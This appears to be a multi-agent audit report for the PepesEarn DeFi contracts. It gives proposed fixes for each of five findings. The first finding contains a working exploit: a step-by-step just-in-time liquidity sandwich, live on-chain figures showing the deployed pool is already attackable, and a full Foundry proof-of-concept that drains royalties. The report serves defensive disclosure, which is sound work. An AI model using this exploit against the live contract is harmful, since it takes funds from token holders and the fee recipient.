# Audit report

> Re-check of fixes: Pepes Earn IMD. Repository https://github.com/0xtenang/PepesFamily, commit 7bb7a9082beab83979ad7900083d4a889b5b5422. Scope: contracts/src/earn/ (PepesEarnIMD, PepesEarnToken, PepesEarnMirror, PepesEarnRenderer). Your previous audit (https://explorer.imd.fun/jobs/e6eda4d8-f50d-47cd-9464-9a272283ccd3) at commit 9c00fa2 found 10 issues. Please confirm each is fixed:
>
> #1, #2, #7: royalty conversion and buyback are now permissionless, hourly and capped per call (0.5% of the IMD/ETH pool's ETH depth; 2% of the $Pepes pool's IMD depth). Is the cap sufficient against sandwiching, and is the depth read safe from manipulation?
> #3: WETH is unwrapped, IMD is split.
> #4: strict 30-day boundary.
> #5: the token deploys its mirror in its own constructor.
> #6: openPool checks $Pepes and the v1 router.
> #8: zero-amount transfers are not activity.
> Please also review all new code for new issues, especially convertRoyalties (it refuses to run inside a foreign PoolManager unlock), maxRoyaltySwap, buybackAndBurnPepes and maxBuyback. Tests: contracts/test/PepesEarn.t.sol and contracts/test/PepesEarn.fork.t.sol (fork: FORK_RPC=https://robinhood.drpc.org forge test --mc PepesEarnForkTest).

| | |
|---|---|
| Repository | https://github.com/0xtenang/PepesFamily.git |
| Commit | `7bb7a9082beab83979ad7900083d4a889b5b5422` |
| Job | `f6d3cd0e-8371-417b-80d6-7b99fc9efa0c` |
| Judged | 2026-10-04 15:32 UTC |
| Findings | 1 high · 2 low · 2 info |

Four agents audited the code as it is at `7bb7a90`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. High: maxRoyaltySwap reads spot in-range liquidity of the hookless IMD/ETH pool: just-in-time liquidity lifts the per-call cap, the whole royalty backlog is swapped in one call and the sandwich pays (fix fo

`contracts/src/earn/PepesEarnIMD.sol:427`

```
        uint256 ethDepth = FullMath.mulDiv(poolManager.getLiquidity(id), Q96, sqrtP);
```

convertRoyalties() sells up to maxRoyaltySwap() of the hook's ETH with sqrtPriceLimitX96 = MIN_SQRT_PRICE+1 and a caller-chosen minImdOut (0 allowed). The cap is 0.5% of getLiquidity(id)*2^96/sqrtP, i.e. of the liquidity active at the current tick at the instant of the call. The IMD/ETH pool is a plain v4 pool (fee 10000, tickSpacing 100, hooks = address(0) in script/DeployEarn.s.sol and deployments/robinhood-v3.json), so anyone can add a concentrated position for the duration of one transaction and remove it afterwards. The `Unlocked` guard only refuses a call made from inside a PoolManager unlock; an attacker uses separate unlocks (swap, add liquidity, convertRoyalties, remove liquidity, swap back) in one transaction, and on Robinhood Chain there is no public mempool to compete with. Two assumptions of the fix break together: the swap is no longer bounded by the depth that actually rests in the pool, and the 1% pool fee the NatSpec (lines 99-100) relies on is paid to the attacker's own JIT position. The attacker pushes the IMD price up, makes the hook sell its ENTIRE ETH balance into the attacker's liquidity at the pushed price, and unwinds. The attack pays whenever the royalty ETH held by the hook exceeds roughly the pool fee (1%) of the pool's real ETH depth, i.e. about two hours of capped conversions. Live state at block 80039867 (read via extsload on 0x8366a39C...): L = 0x4f861bb1c0351eb101, sqrtPriceX96 = 0x13ef96d80c72e5fc2a538720d6, so the formula gives 73.6 ETH of depth and a cap of 0.37 ETH per hour; a backlog of ~0.75 ETH is already attackable, and the hourly cap itself makes backlogs accumulate. Loss falls on $EARN holders (75%) and feeRecipient (25%). A JIT position of one tick spacing that is all ETH costs the attacker only temporary capital of about the backlog size and is withdrawn intact. The same spot read also overstates depth without any attacker liquidity wherever resting liquidity is uneven (stop the push just inside a thick band). maxBuyback() in PepesEarnToken uses the same formula but is not exposed the same way: the $Pepes pool's v1 hook rejects third-party liquidity, so its L is fixed and the 2%-vs-4%-fee argument holds. The existing test test_royalties_sandwichDoesNotPay only sandwiches with swaps and never changes pool liquidity, which is why it passes. Fix, keeping the permissionless/hourly/capped design: do not derive the cap from liquidity that can be added in the same transaction. Apply min(0.5% of live depth, absolute per-call ETH ceiling) where the ceiling is a constant or an owner-set value inside hard bounds, and additionally bound the execution price: record sqrtPriceX96 at each successful conversion (so the reference is at least ROYALTY_INTERVAL old) and pass a sqrtPriceLimitX96 derived from it (or skip the ETH leg without swapping when the current price is outside a tolerance band). A liquidity snapshot from the previous call alone is not enough, because the attacker can add the position around that call too. Reverting convertRoyalties in the JIT situation also makes the attached proof pass.

**Reproduction**

State (the project's own unit-test pool): IMD/ETH pool fee 1%, spacing 100, no hook, full-range liquidity 10_000e18 at 1:1 (10,000 ETH depth, honest cap = maxRoyaltySwap() = 50 ETH); one $EARN holder; hook holds 500 ETH of royalties (vm.deal). Attacker, one transaction, outside any unlock: (1) swap 9,000 ETH -> IMD with sqrtPriceLimit = getSqrtPriceAtTick(-10700)+1; (2) PoolModifyLiquidityTest.modifyLiquidity(tickLower -10700, tickUpper -10600, liquidityDelta 1.35e23) (~1,150 ETH, all returned in step 4); (3) hook.convertRoyalties(0); (4) remove the position; (5) swap all IMD back to ETH. Expected (what the #1 fix claims): step 3 swaps at most ~50 ETH and the attacker ends with less ETH than they started. Actual: maxRoyaltySwap() returns 1,237.87 ETH after step 2, step 3 swaps all 500 ETH in the one call, and the attacker ends 212.75 ETH richer (42% of the royalties, taken from holders and feeRecipient). Run: cd contracts && forge test --offline --match-path test/scratch/RoyaltyCapJit.t.sol -vv -> FAIL "one call swapped far more than 0.5% of the pool's real depth: 500000000000000000000 > 100000000000000000000". The two other specialist proofs (narrow 200-tick band around the pushed tick, 20 ETH backlog on a 100 ETH pool; 400,000e18 band on a 10,000 ETH pool) fail the same way with profits of 3.77 ETH and 145.68 ETH respectively; all three were re-run by the judge on this commit.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
import {PoolModifyLiquidityTest} from "v4-core/src/test/PoolModifyLiquidityTest.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {SwapParams, ModifyLiquidityParams} from "v4-core/src/types/PoolOperation.sol";

import {PepesEarnIMD} from "src/earn/PepesEarnIMD.sol";
import {PepesEarnToken} from "src/earn/PepesEarnToken.sol";
import {PepesEarnRenderer} from "src/earn/PepesEarnRenderer.sol";
import {PepesFamilyRouter} from "src/PepesFamilyRouter.sol";

contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }

    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
        balanceOf[f] -= a;
        balanceOf[to] += a;
        return true;
    }
}

/// @dev Stands in for the PepesFamily v1 router/pad; only its addresses matter here.
contract PepesRouterStub {
    function pad() external view returns (address) {
        return address(this);
    }
}

/// @notice The per-call royalty cap is 0.5% of `getLiquidity()/sqrtP` of a hookless pool. In-range liquidity can
///         be added for one transaction (just-in-time) by anyone, so the cap is whatever the caller wants it to be
///         and the whole royalty balance is swapped at a price the caller has pushed.
contract RoyaltyCapJitTest is Test {
    PoolManager pm;
    ERC20Mock imd;
    PoolKey imdEthKey;
    PepesEarnIMD hook;
    PepesEarnToken earn;
    PoolSwapTest swapper;
    PoolModifyLiquidityTest lp;
    PoolSwapTest.TestSettings settings = PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false});
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.warp(1_800_000_000);
        pm = new PoolManager(address(this));
        imd = new ERC20Mock();
        swapper = new PoolSwapTest(pm);
        lp = new PoolModifyLiquidityTest(pm);

        // IMD/ETH pool as on Robinhood Chain: 1% fee, tick spacing 100, no hook. 10,000 ETH of depth at 1:1.
        imdEthKey = PoolKey(Currency.wrap(address(0)), Currency.wrap(address(imd)), 10_000, 100, IHooks(address(0)));
        pm.initialize(imdEthKey, TickMath.getSqrtPriceAtTick(0));
        vm.deal(address(this), 20_000 ether);
        imd.mint(address(this), 20_000e18);
        imd.approve(address(lp), type(uint256).max);
        lp.modifyLiquidity{value: 20_000 ether}(imdEthKey, ModifyLiquidityParams(-887200, 887200, 10_000e18, 0), "");

        PepesRouterStub pepesRouter = new PepesRouterStub();
        bytes memory initCode = abi.encodePacked(
            type(PepesEarnIMD).creationCode,
            abi.encode(
                pm,
                address(imd),
                address(this),
                address(0xFEE),
                int24(0),
                PepesEarnIMD.ImdEthPool(10_000, 100, address(0)),
                address(new ERC20Mock()), // weth
                address(new ERC20Mock()), // pepes
                address(pepesRouter)
            )
        );
        bytes32 h = keccak256(initCode);
        address deployed;
        for (uint256 salt;; salt++) {
            address a = vm.computeCreate2Address(bytes32(salt), h, address(this));
            if (uint160(a) & 0x3FFF == 0x28CC) {
                assembly {
                    deployed := create2(0, add(initCode, 0x20), mload(initCode), salt)
                }
                break;
            }
        }
        hook = PepesEarnIMD(payable(deployed));
        earn = new PepesEarnToken(address(hook), address(new PepesEarnRenderer()));
        hook.openPool(address(earn));

        // one holder, so royalties have someone to go to
        imd.mint(alice, 100e18);
        vm.startPrank(alice);
        imd.approve(hook.router(), type(uint256).max);
        PepesFamilyRouter(payable(hook.router())).buy(address(earn), 100e18, 0, block.timestamp);
        vm.stopPrank();
    }

    receive() external payable {}

    function test_jitLiquidityLiftsTheCap_andTheSandwichPays() public {
        vm.deal(address(hook), 500 ether); // royalty backlog: 5% of the pool's ETH depth
        uint256 honestCap = hook.maxRoyaltySwap();
        assertApproxEqRel(honestCap, 50 ether, 0.001e18);

        vm.deal(attacker, 20_000 ether);
        uint256 eth0 = attacker.balance;
        vm.startPrank(attacker);
        imd.approve(address(swapper), type(uint256).max);
        imd.approve(address(lp), type(uint256).max);

        // 1. buy IMD with ETH, stopping just above the tick -10700 boundary
        swapper.swap{value: 9_000 ether}(
            imdEthKey, SwapParams(true, -9_000 ether, TickMath.getSqrtPriceAtTick(-10_700) + 1), settings, ""
        );
        // 2. one-tick-spacing position whose lower edge is the current price: it is all ETH (~1,150 ETH),
        //    counts fully in getLiquidity(), and is left behind by the first wei of the royalty swap
        ModifyLiquidityParams memory jit = ModifyLiquidityParams(-10_700, -10_600, 1.35e23, 0);
        lp.modifyLiquidity{value: 1_200 ether}(imdEthKey, jit, "");
        uint256 liftedCap = hook.maxRoyaltySwap();
        // 3. the "capped" conversion
        try hook.convertRoyalties(0) {} catch {}
        uint256 swapped = 500 ether - address(hook).balance;
        // 4. unwind
        jit.liquidityDelta = -jit.liquidityDelta;
        lp.modifyLiquidity(imdEthKey, jit, "");
        swapper.swap(
            imdEthKey, SwapParams(false, -int256(imd.balanceOf(attacker)), TickMath.MAX_SQRT_PRICE - 1), settings, ""
        );
        vm.stopPrank();

        emit log_named_decimal_uint("honest cap (ETH)", honestCap, 18);
        emit log_named_decimal_uint("cap with JIT liquidity (ETH)", liftedCap, 18);
        emit log_named_decimal_uint("royalty ETH swapped in one call", swapped, 18);
        if (attacker.balance > eth0) emit log_named_decimal_uint("attacker profit (ETH)", attacker.balance - eth0, 18);

        assertLe(swapped, honestCap * 2, "one call swapped far more than 0.5% of the pool's real depth");
        assertLe(attacker.balance, eth0, "sandwiching the royalty conversion must lose money");
    }
}
```

### 2. Low: Receiving any non-zero $EARN, even 1 wei, still counts as the recipient's activity: a third party can keep any wallet's rewards from ever expiring (fix for #8 covers only amount == 0)

`contracts/src/earn/PepesEarnToken.sol:211`

```
            lastActive[to] = block.timestamp;
```

_moved() now ignores amount == 0, but every non-zero transfer still stamps lastActive[to] for a recipient who did nothing. Sending 1 wei of $EARN needs no allowance from the victim and costs the sender 1e-18 of an NFT plus gas. expiredRewardsOf() returns 0 while block.timestamp <= lastActive + 30 days, so one dust transfer per 30 days keeps an abandoned wallet's unclaimed rewards out of the buyback reserve indefinitely, and a single dust transfer cancels a pending recycle()/recycleMany() for a given holder. The documented rule is 'a wallet that has neither claimed nor moved any $EARN', i.e. the holder's own actions. No holder loses funds (the affected holder is favoured); the $Pepes buyback-and-burn is what can be starved by anyone, hence low. Fix that keeps the expiry math valid: stamp lastActive[to] only when the recipient acted or bought (msg.sender == to on the ERC20 path, msgSender == to on the NFT path, or isExcluded(from), i.e. a pool/router buy), and otherwise only initialise it when it is still 0 so the `last == 0` guard keeps working. expiredRewardsOf multiplies per-share growth since the cutoff by the current balance; an un-stamped inbound transfer can only raise that balance, so `recent` is then over-estimated in the holder's favour, while outgoing transfers and claims still mark the holder active.

**Reproduction**

Unit setup (contracts/test/PepesEarn.t.sol): alice buys with 100 IMD, bob buys with 100 IMD, warp 31 days. expiredRewardsOf(alice) = 5999999999999999999. bob calls earn.transfer(alice, 1). Expected: alice has neither claimed nor moved, so her expired rewards stay recyclable (as they do after transferFrom(alice, dan, 0) in test_expiry_zeroTransferDoesNotCountAsActivity). Actual: lastActive[alice] == block.timestamp, expiredRewardsOf(alice) == 0, recycle(alice) returns 0; repeating the 1-wei transfer at +30d and +60d keeps expiredRewardsOf(alice) == 0 at +92 days. Reproduced by the judge in a Foundry test on this commit (test_judge_dustTransferResetsTimer).

### 3. Low: A just-in-time buyer can take most of a royalty batch from existing holders because anyone chooses when convertRoyalties distributes it

`contracts/src/earn/PepesEarnIMD.sol:409`

```
            PepesEarnToken(payable(token)).distribute();
```

Trade fees are protected from this: the routers flush before the buyer receives tokens. A royalty batch is instead credited pro rata to whoever holds $EARN at the instant convertRoyalties runs, and the caller picks that instant. The IMD part is distributed with no cap at all; the ETH part in steps of maxRoyaltySwap (about 147 IMD per call at today's pool, against a ~2,000 IMD market cap). A caller can buy $EARN, call convertRoyalties, claim and sell in one transaction; the only cost is the 4%+4% hook fee on the notional (LP fee is 0, so price impact is returned on the sell, and part of the buy's own 3% holder fee is recovered on the next flush). It pays whenever the holders' share of the batch exceeds roughly 8% of the value of the eligible supply, which is the state right after launch (few tokens outside the pool) or whenever royalties have been left unconverted for a while. Long-term holders lose the diverted share; no protocol funds are lost, hence low. Mitigation that keeps the design: release a converted batch linearly over the following ROYALTY_INTERVAL (stream it) instead of crediting it in one step, or cap the IMD credited per call relative to the eligible supply's value so one call never credits more than the round-trip fee can protect.

**Reproduction**

Unit setup: alice buys with 100 IMD and bob with 10 IMD (eligibleSupply = 100.30 EARN); 60 IMD of royalties sit on the hook (imd.transfer(hook, 60e18)). dan, in one transaction: router.buy(earn, 150e18, 0, deadline) (receives 121.60 EARN); hook.convertRoyalties(0); earn.claim(); router.sell(earn, 121.60e18, 0, deadline). Expected: the 45 IMD holder share goes to alice and bob, who held when the royalties were paid, and dan loses his 8% in fees. Actual: dan claims 24.66 IMD of the 45 IMD batch and ends +12.90 IMD after all fees; alice gains 26.63 IMD. Reproduced by the judge in a Foundry test on this commit (test_judge_royaltyBatchSniping).

### 4. Info: convertRoyalties consumes the hourly slot even when it converts nothing (empty call, or cap == 0 when the IMD/ETH price is outside all positions)

`contracts/src/earn/PepesEarnIMD.sol:400`

```
        lastRoyaltyConversion = block.timestamp;
```

lastRoyaltyConversion is written before the balances are looked at, and the function does not revert when there is nothing to do (no WETH, no IMD, ethIn == 0, minImdOut == 0). Anyone can therefore burn the hour with an empty call, and royalties that arrive right after wait a full ROYALTY_INTERVAL; a caller repeating the empty call at each hour boundary keeps conversion permanently one hour behind. The same happens whenever maxRoyaltySwap() is 0 (IMD/ETH pool not initialised under the configured key, which the constructor does not verify, or no liquidity in range at the current tick): each call records the timestamp, swaps nothing, and the ETH stays in the hook, which has no other way out. buybackAndBurnPepes handles the same case correctly (reverts BadAmount before writing lastBuyback). Fix: write lastRoyaltyConversion only when the call moved something (wethBal, imdBal or ethIn non-zero), or revert otherwise.

**Reproduction**

Unit setup, token opened, hook holds 0 ETH / 0 WETH / 0 IMD at time T. carol calls convertRoyalties(0): returns 0 and lastRoyaltyConversion == T. At T+1 a marketplace pays 1 ETH of royalties to the hook. Expected: convertRoyalties(0) can convert it. Actual: convertRoyalties(0) reverts TooSoon until T+3600. Reproduced by the judge in a Foundry test on this commit (test_judge_emptyConvertBurnsHour).

### 5. Info: The fork test never exercises the real Robinhood WETH unwrap that every convertRoyalties call depends on

`contracts/src/earn/PepesEarnIMD.sol:403`

```
        if (wethBal != 0) IWETH(weth).withdraw(wethBal);
```

convertRoyalties unwraps any WETH balance before touching the ETH or IMD balances, so a reverting withdraw() at the configured WETH address would stop all royalty conversion (ETH and IMD legs included) as soon as anyone sends that token to the hook, and the contract has no other way to remove it. test/PepesEarn.fork.t.sol deploys with the real WETH (0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73) but only tests an ETH royalty; the unit test uses a MockWETH. Judge check on chain (robinhood.drpc.org, block 80039867): that address is an EIP-1967 proxy (implementation 0xc6b81b429797e0f555440b70cd99e032d7ae947e) whose code contains the withdraw(uint256) selector 0x2e1a7d4d, and an eth_call of withdraw(0) from the zero address reverts with 'ERC20: burn from the zero address', the aeWETH behaviour, so withdraw is present and the #3 fix is expected to work on the live chain. This is a coverage gap, not a defect in the code as deployed. Suggested: add a fork assertion that a WETH royalty converts (deal WETH to the hook via deposit(), call convertRoyalties), and consider a try/catch around the unwrap so a WETH problem can never block the ETH and IMD legs.

**Reproduction**

Read contracts/test/PepesEarn.fork.t.sol: the only royalty sent to the hook is `address(hook).call{value: 0.02 ether}` (line 144); no test transfers WETH to the hook. Expected: a fork test that transfers the configured WETH to the hook and asserts convertRoyalties unwraps it. Actual: no such test; the WETH path is covered only against MockWETH in the unit suite (test_royalties_wethUnwrappedAndImdSplit).

---

Judge's submission `6609e837f6273f23b9ae3cf82c54d9b9fd9ec89a7ccd2fc04545e551d2fd585b`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
